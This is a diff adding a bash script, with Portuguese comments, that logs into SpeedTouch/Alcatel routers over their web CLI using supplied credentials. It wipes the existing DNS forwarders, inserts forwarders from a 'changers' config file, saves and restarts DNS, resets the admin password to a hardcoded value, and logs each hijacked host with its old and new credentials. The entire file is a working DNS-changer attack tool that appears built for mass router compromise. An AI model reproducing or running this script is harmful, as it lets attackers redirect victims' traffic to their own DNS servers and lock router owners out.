@@ -1,0 +1,39 @@
+#!/bin/bash
+
+##########################
+# by bonny               #
+##########################
+# CONFIG
+source configs/changers.cfg
+HOSTNAME="$1"
+USERNAME="$2"
+PASSWORD="$3"
+PASSWD="eldiablo"
+###########################
+
+for dnsList in `${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/dns/fwdlist" | grep '0.0.0.0' | sed -e 's/    /;/g' -e 's/  //g' -e 's/;; no//g'`; do
+	dnsEntry=`echo $dnsList | cut -d ';' -f1`
+	dnsSrc=`echo $dnsList | cut -d ';' -f2`
+	dnsMask=`echo $dnsList | cut -d ';' -f3`
+	
+	# DELETA
+	${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+fwddelete&src=${dnsSrc}&mask=${dnsMask}&dns=${dnsEntry}&imgpos.x=24&imgpos.y=11" 1>/dev/null 2>/dev/null
+done
+
+# ADICIONA
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+fwdadd&dns=${DNS1}&src=0.0.0.0&mask=0.0.0.0&direct=&imgpos.x=20&imgpos.y=4" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+fwdadd&dns=${DNS2}&src=0.0.0.0&mask=0.0.0.0&direct=&imgpos.x=20&imgpos.y=4" 1>/dev/null 2>/dev/null
+
+# SALVA TODAS AS CONFIGS
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+save&imgpos.x=22&imgpos.y=7" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cli/?cmd=config+save&imgpos.x=16&imgpos.y=6" 1>/dev/null 2>/dev/null
+
+# DNS SERVER RESTART
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+stop&imgpos.x=25&imgpos.y=6" 1>/dev/null 2>/dev/null
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=dns+start&imgpos.x=13&imgpos.y=10" 1>/dev/null 2>/dev/null
+
+# MUDA O PASS
+${CURL} -u "${USERNAME}:${PASSWORD}" "http://${HOSTNAME}/cgi/cli/?cmd=system+setpassword&password=${PASSWD}&imgpos.x=29&imgpos.y=7" 1>/dev/null 2>/dev/null
+
+echo "[+] modificado, http://$HOSTNAME $USERNAME:$PASSWORD [SPEEDTOUCH/ALCATEL]"
+echo "http://$HOSTNAME ($USERNAME:$PASSWORD => $PASSWD) [SPEEDTOUCH/ALCATEL]" >> logs/modificados.log
